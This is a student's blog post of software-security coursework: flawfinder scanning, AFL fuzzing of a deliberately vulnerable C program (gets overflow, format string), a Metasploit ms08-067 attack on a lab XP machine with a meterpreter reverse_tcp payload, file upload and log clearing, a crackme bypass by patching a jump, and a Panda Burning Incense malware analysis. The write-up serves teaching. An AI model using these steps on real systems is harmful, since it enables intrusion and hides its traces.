@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="待葡萄成熟透">
+  <meta name="keyword" content="">
+  
+    <link rel="shortcut icon" type="image/ico" href="/抱抱.png"/>
+  
+  <title>
+    
+      软件安全课程实践 | Ydl&#39;s Blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.3.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Ydl's Blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>软件安全课程实践</h2>
+  <p class="post-date">2023-02-10</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="第一题-P239-12"><a href="#第一题-P239-12" class="headerlink" title="第一题 P239 12."></a>第一题 P239 12.</h3><ol>
+<li><p>安装ubuntu</p>
+</li>
+<li><p><code>sudo pip install flawfinder</code> </p>
+<p>使用root权限是为了将flawfinder加入环境变量，可以直接使用flawfinder作为命令，如果直接pip安装，接下来的操作会报错提示没有flawfinder命令</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/1.png"></li>
+<li><p>去知乎上搜索<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/26645220">github上的c项目</a>，并在ubuntu上以zip包形式下载下来</p>
+</li>
+<li><p><code>flawfinder --quiet --html $&#123;目标目录路径&#125; &gt; $&#123;输出路径&#125;</code></p>
+ <img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/3.png"></li>
+<li><p>解析错误，需要将源代码转换至utf-8编码</p>
+<blockquote>
+<p><code>sudo pip install cvt2utf</code><br><code>cvt2utf convert ./ -b -i c cpp -x txt</code> 将cpp和c文件转换为utf-8编码</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215111730.png"></blockquote>
+</li>
+<li><p>再次运行flawrfinder命令，成功输出results.html</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215111925.png"></li>
+<li><p>对比其他C/C++代码分析工具如RATS、Splint的异同</p>
+<ul>
+<li>Flawfinder：一款开源的用于C/C++静态扫描的分析工具，其根据内部字典数据库进行静态搜索，匹配简单的缺陷与漏洞，flawfinder工具不需要编译C/C++代码，可以直接进行扫描分析。简单快速，优点是免费，且不需要编译。<a target="_blank" rel="noopener" href="https://blog.csdn.net/liweibin812/article/details/84326215">source</a></li>
+<li>RATS：一种用于C、C++、Python、Per和PHP代码的安全审计工具。它能够对源代码进行扫描，找出潜在的危险函数调用。该工具的最终目标并不是找出代码漏洞，而是为人工安全审计提供一个方便合理的起点。RATS结合了静态检查技术和深度语义分析技术检查缓冲区溢出漏洞。RATS遵守通用公共许可证GPL。RATS可以对整个工程代码进行检查，而不是单一文件。同时，RATS还可以检查数组的边界。<a target="_blank" rel="noopener" href="https://patents.google.com/patent/CN101017458A/zh">source</a></li>
+<li>Splint：(原来的 LCLint) 是一个GNU免费授权的Lint程序，是一个动态检查C语言程序安全弱点和编写错误的程序。Splint会进行多种常规检查,包括未使用的变量,类型不一致,使用未定义变量,无法执行的代码,忽略返回值,执行路径未返回,无限循环等错误。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/qingxia/archive/2012/09/13/2683535.html">source</a></li>
+</ul>
+</li>
+</ol>
+<h3 id="第二题-P239-15"><a href="#第二题-P239-15" class="headerlink" title="第二题 P239 15."></a>第二题 P239 15.</h3><ol>
+<li><p>下载American Fuzzy Lop项目 </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">tar -zxvf afl-latest.tgz</span><br><span class="line"><span class="built_in">cd</span> afl-2.52b</span><br></pre></td></tr></table></figure>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215114409.png"></li>
+<li><p>安装gcc编译器 <code>sudo apt-get install gcc</code></p>
+</li>
+<li><p>编译以及安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make // 从makefile中读取指令，然后编译</span><br><span class="line">sudo make install // 从makefile中读取指令，安装到指定的位置</span><br><span class="line">afl-fuzz // 验证是否安装成功</span><br></pre></td></tr></table></figure>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215115132.png">
+</li>
+<li><p>创建测试文件<code>mytestfile.c</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf); <span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf); <span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>使用<code>afl-gcc -g -o afl_test mytestfile.c</code>进行编译插桩</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215122426.png">
+</li>
+<li><p>创建fuzz_input和fuzz_output文件夹作为模糊测试的输入输出，并在fuzz_input下通过<code>echo 666 &gt; testcase</code>创建一个测试样本</p>
+</li>
+<li><p>开始模糊测试<code>afl-fuzz -i fuzz_input -o fuzz_output ./afl_test</code></p>
+<blockquote>
+<p>报错，系统配置问题导致出错</p>
+ <img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215124029.png">
+解决方案：root权限执行  `echo ecore > /proc/sys/kernel/core_pattern` 
+</blockquote>
+</li>
+</ol>
+<ol start="8">
+<li>再次开始模糊测试<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215124815.png">
+14分钟后
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215130141.png">
+结果分析
+ <img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215130110.png"></li>
+</ol>
+<ul>
+<li><p>crashes文件夹里面是产生crash的样例</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216224505.png">
+</li>
+<li><p>hangs里面是产生超时的样例</p>
+</li>
+<li><p>queue里面是每个不同执行路径的测试用例</p>
+</li>
+</ul>
+<h3 id="第三题-P239-16"><a href="#第三题-P239-16" class="headerlink" title="第三题 P239 16."></a>第三题 P239 16.</h3><ol>
+<li><p>ubuntu下安装Metasploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/met</span><br><span class="line">asploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215161328.png">
+</li>
+<li><p>在msf控制台输入<code>search ms08-067</code>搜索并使用<code>ms08-067</code>漏洞模块</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215170105.png">
+</li>
+<li><p><code>show options</code>查看当前配置</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215172208.png"></li>
+<li><p>使用<code>set RHOST 172.16.237.142</code>命令设置靶机ip</p>
+<blockquote>
+<p>需要关闭xp的防火墙，否则两台电脑无法互相ping通</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215172554.png"></blockquote>
+</li>
+<li><p>使用<code>set payload windows/meterpreter/reverse_tcp</code>设置payload并再次查看配置</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215173021.png"></li>
+<li><p>输入<code>exploit</code>命令开始对靶机进行渗透攻击，并进入特殊的payload：<code>meterpreter</code></p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215173239.png"></li>
+<li><p>进行渗透操作</p>
+<ul>
+<li>上传攻击机文件至靶机<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215173717.png">
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215173736.png"></li>
+<li>截屏<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215173843.png"></li>
+</ul>
+</li>
+<li><p><code>clearev</code>清除靶机日志</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230215174623.png">
+
+
+
+</li>
+</ol>
+<h3 id="第四题-P304-25"><a href="#第四题-P304-25" class="headerlink" title="第四题 P304 25."></a>第四题 P304 25.</h3><ol>
+<li><p>从github里<a target="_blank" rel="noopener" href="https://github.com/TonyChen56/160-Crackme">160道crackme</a>中找到一道<code>Brad Soblesky.1.exe</code>，使用vc6编写，在给定的输入框中输入正确的字符串才算成功，否则失败</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216155156.png"></li>
+<li><p>使用OllyDbg打开上述exe文件</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216151723.png"></li>
+<li><p>因为提示输入的内容、输入错误/成功的消息都是由字符串组成，所以我们搜索文本字符串</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216152252.png">
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216152319.png">
+
+<p>在这里，我们看到了输入错误的提示<code>Incorrect try again!!</code>，因为这一部分猜测是拿我们输入的字符串（可能进一步加密）和正确密码对比后的结果，所以我们双击找到起始函数位置下的断点，倒推对比的逻辑</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216153244.png">
+
+<p>这幅图里可以看到两种情况，分别是正确的和错误的，在此之前则是判断以及跳转的逻辑，重点关注 <code>jnz</code> 和 <code>jmp</code></p>
+<blockquote>
+<p><code>jnz</code>和<code>jmp</code>在汇编语言中都代表指令的跳转，前者表示上条指令结果不为0时转移，后者则是无条件跳转；指令中的SHORT规定了转移地址的标号为有符号的8位二进制数</p>
+</blockquote>
+</li>
+<li><p>尝试修改汇编代码，把跳转逻辑直接抹掉并保存</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216154908.png">
+</li>
+<li><p>再次运行程序，发现无论输入什么都提示<code>Correct way to go!!</code>，破解成功</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216155103.png">
+
+</li>
+</ol>
+<h3 id="第五题-P342-12"><a href="#第五题-P342-12" class="headerlink" title="第五题 P342 12."></a>第五题 P342 12.</h3><h4 id="熊猫烧香的病毒行为"><a href="#熊猫烧香的病毒行为" class="headerlink" title="熊猫烧香的病毒行为"></a>熊猫烧香的病毒行为</h4><ol>
+<li><p>运行病毒前</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216160714.png">
+</li>
+<li><p>运行病毒后，通过对比可以发现多出了一个名为<code>spoclsv.exe</code>的进程，即熊猫烧香病毒创建出来的进程</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216161215.png">
+</li>
+<li><p>启动项被修改</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216162629.png" width="60%">
+
+<blockquote>
+<p>启动项可以用来设置开机自启动</p>
+</blockquote>
+</li>
+<li><p>注册表被编辑，并启动了对应的<code>spoclsv.exe</code>文件</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216163044.png">
+
+<blockquote>
+<p>注册表实际上是一个庞大的数据库，这个数据库记录了机器软硬件环境的各种信息，对操作系统及应用程序的正常运行至关重要。具体来讲，此数据库包含了Windows系统和应用程序的初始化信息、应用程序和文档文件的关联、硬件设备的说明、状态和属性等数据，操作系统和应用程序会对此数据库进行频繁存取，以保存和获取必要的数据<a target="_blank" rel="noopener" href="https://blog.csdn.net/leixihua/article/details/1529864">source</a></p>
+</blockquote>
+<p>在对应目录下发现了该exe文件</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216172651.png">
+</li>
+<li><p>图标被修改</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216174823.png">
+</li>
+<li><p>C盘根目录下生成<code>setup.exe</code>和<code>autorun.inf</code>文件</p>
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216175305.png" width="60%">
+
+
+
+
+
+
+</li>
+</ol>
+<h4 id="分析熊猫烧香的病毒结构"><a href="#分析熊猫烧香的病毒结构" class="headerlink" title="分析熊猫烧香的病毒结构"></a>分析熊猫烧香的病毒结构</h4><p>   三个关键函数，作用分别是释放病毒并运行、感染其他文件、病毒的自我保护，这里选取第一个函数进行具体分析<br>   <img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216180702.png"></p>
+<p>拷贝病毒并运行</p>
+   <img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216181356.png">
+    
+检查Desktop.ini文件是否存在，不存在则跳转
+<img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216214137.png">
+
+<blockquote>
+<p><code>call</code>是在调用字符串拼接函数，把拼接的结果完整路径放到EAX寄存器里，再次调用函数来判断该路径文件是否存在，如果文件不存在则跳转至<code>00408110</code></p>
+</blockquote>
+<p>如果存在则删掉该文件<br><img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216213948.png"></p>
+<blockquote>
+<p>还是调用同样的字符串拼接函数，之后把对应的文件删除</p>
+</blockquote>
+<p>读取病毒文件到内存中<br><img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216220353.png"></p>
+<p>判断文件大小是否为0、是否被感染、是否第一次运行<br><img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216215927.png"></p>
+<blockquote>
+<p>test是为了判断文件大小是否为0，不为0则文件首地址放到EAX寄存器里；再CMP比较文件最后一个数据是否为0，为0表示没有被感染过；最后再CMP判断是否是第一次运行病毒程序</p>
+</blockquote>
+<p>拷贝病毒到系统目录下，并且运行起来<br><img src="https://ydl8023.oss-cn-beijing.aliyuncs.com/20230216215400.png"></p>
+<p>小结</p>
+<ol>
+<li>检查Desktoi.ini是否存在，存在就删除，不存在就创建</li>
+<li>拷贝病毒文件到内存，并作相应的判断</li>
+<li>拷贝到系统目录下，并且运行</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#课业" >
+    <span class="tag-code">课业</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/posts/12639/">
+        <span class="nav-arrow">← </span>
+        
+          设计模式六大原则
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/posts/26641/">
+        
+          📖算法 | 每日一题
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- No Comment -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98-P239-12"><span class="toc-nav-text">第一题 P239 12.</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-P239-15"><span class="toc-nav-text">第二题 P239 15.</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98-P239-16"><span class="toc-nav-text">第三题 P239 16.</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98-P304-25"><span class="toc-nav-text">第四题 P304 25.</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%AC%AC%E4%BA%94%E9%A2%98-P342-12"><span class="toc-nav-text">第五题 P342 12.</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%9A%84%E7%97%85%E6%AF%92%E8%A1%8C%E4%B8%BA"><span class="toc-nav-text">熊猫烧香的病毒行为</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E5%88%86%E6%9E%90%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%9A%84%E7%97%85%E6%AF%92%E7%BB%93%E6%9E%84"><span class="toc-nav-text">分析熊猫烧香的病毒结构</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://ydl8686.github.io/posts/49951/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2023 | Article by <a target="_blank" rel="noopener" href="https://github.com/ydl8686">ydl</a>
+    <br>
+    Theme by <a target="_blank" rel="noopener" href="https://github.com/yanm1ng">yanm1ng</a>
+  </p>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'false';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+  </body>
+</html>
